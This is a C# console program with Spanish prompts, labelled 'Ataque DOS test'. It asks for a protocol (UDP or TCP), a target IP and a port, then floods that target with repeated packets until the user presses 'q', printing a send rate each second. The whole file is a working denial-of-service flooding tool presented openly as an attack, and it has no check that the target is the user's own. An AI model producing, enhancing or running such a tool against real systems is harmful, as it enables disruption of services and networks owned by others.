using System.Net;
using System.Net.Sockets;
using System.Text;

namespace PortWindostool
{
    class Program
    {
        static async Task Main(string[] args)
        {
            Console.Title = "Ataque DOS test";
            Console.BackgroundColor = ConsoleColor.Black;
            Console.Clear();
            WriteColored("Introduce el protocolo (UDP o TCP): ", ConsoleColor.Cyan);
            string protocol = Console.ReadLine().Trim().ToUpper();
            while (protocol != "UDP" && protocol != "TCP")
            {
                WriteColored("Protocolo inválido. Introduce UDP o TCP: ", ConsoleColor.Red);
                protocol = Console.ReadLine().Trim().ToUpper();
            }
            IPAddress parsedIP;
            string ip;
            do
            {
                WriteColored("Introduce la dirección IP: ", ConsoleColor.Cyan);
                ip = Console.ReadLine().Trim();
                if (!IPAddress.TryParse(ip, out parsedIP))
                    WriteColored("IP inválida. Inténtalo de nuevo.", ConsoleColor.Red);
            } while (!IPAddress.TryParse(ip, out parsedIP));
            int port = 0;
            bool validPort = false;
            do
            {
                WriteColored("Introduce el puerto: ", ConsoleColor.Cyan);
                string portInput = Console.ReadLine().Trim();
                validPort = int.TryParse(portInput, out port);
                if (!validPort)
                    WriteColored("Puerto inválido. Inténtalo de nuevo.", ConsoleColor.Red);
            } while (!validPort);
            Console.WriteLine();
            WriteColored($"Iniciando ataque {protocol} a {ip}:{port}", ConsoleColor.Green);
            WriteColored("Presiona 'q' para detener el envío de paquetes...", ConsoleColor.Yellow);
            CancellationTokenSource cts = new CancellationTokenSource();
            Task sendTask = protocol == "UDP" ? SendUdpPackets(ip, port, cts.Token) : SendTcpPackets(ip, port, cts.Token);
            Task monitorTask = Task.Run(() =>
            {
                while (!cts.Token.IsCancellationRequested)
                {
                    if (Console.KeyAvailable)
                    {
                        var key = Console.ReadKey(true);
                        if (key.Key == ConsoleKey.Q)
                        {
                            cts.Cancel();
                        }
                    }
                    Thread.Sleep(100);
                }
            });
            await Task.WhenAny(sendTask, monitorTask);
            Console.WriteLine();
            WriteColored("Envío cancelado. Presiona cualquier tecla para salir...", ConsoleColor.Magenta);
            Console.ReadKey();
        }

        static async Task SendUdpPackets(string ip, int port, CancellationToken token)
        {
            using (UdpClient udpClient = new UdpClient())
            {
                IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(ip), port);
                byte[] data = Encoding.ASCII.GetBytes("Ataque DOS Test");
                int counter = 0;
                DateTime lastUpdate = DateTime.Now;
                try
                {
                    while (!token.IsCancellationRequested)
                    {
                        await udpClient.SendAsync(data, data.Length, remoteEP);
                        counter++;
                        if ((DateTime.Now - lastUpdate).TotalSeconds >= 1)
                        {
                            Console.WriteLine();
                            WriteColored($"Paquetes UDP enviados en el último segundo: {counter}", ConsoleColor.Yellow);
                            counter = 0;
                            lastUpdate = DateTime.Now;
                        }
                        await Task.Delay(1, token);
                    }
                }
                catch (OperationCanceledException) { }
                catch (Exception ex)
                {
                    WriteColored("Error en UDP: " + ex.Message, ConsoleColor.Red);
                }
            }
        }

        static async Task SendTcpPackets(string ip, int port, CancellationToken token)
        {
            int counter = 0;
            DateTime lastUpdate = DateTime.Now;
            try
            {
                using (TcpClient tcpClient = new TcpClient())
                {
                    WriteColored($"Conectando a {ip}:{port} por TCP...", ConsoleColor.Cyan);
                    await tcpClient.ConnectAsync(ip, port);
                    WriteColored("Conexión establecida.", ConsoleColor.Green);
                    using (NetworkStream stream = tcpClient.GetStream())
                    {
                        byte[] data = Encoding.ASCII.GetBytes("Ataque DOS Test");
                        while (!token.IsCancellationRequested)
                        {
                            await stream.WriteAsync(data, 0, data.Length, token);
                            counter++;
                            if ((DateTime.Now - lastUpdate).TotalSeconds >= 1)
                            {
                                Console.WriteLine();
                                WriteColored($"Paquetes TCP enviados en el último segundo: {counter}", ConsoleColor.Yellow);
                                counter = 0;
                                lastUpdate = DateTime.Now;
                            }
                            await Task.Delay(1, token);
                        }
                    }
                }
            }
            catch (OperationCanceledException) { }
            catch (Exception ex)
            {
                WriteColored("Error en TCP: " + ex.Message, ConsoleColor.Red);
            }
        }

        static void WriteColored(string message, ConsoleColor color)
        {
            Console.ForegroundColor = color;
            Console.WriteLine(message);
            Console.ResetColor();
        }
    }
}
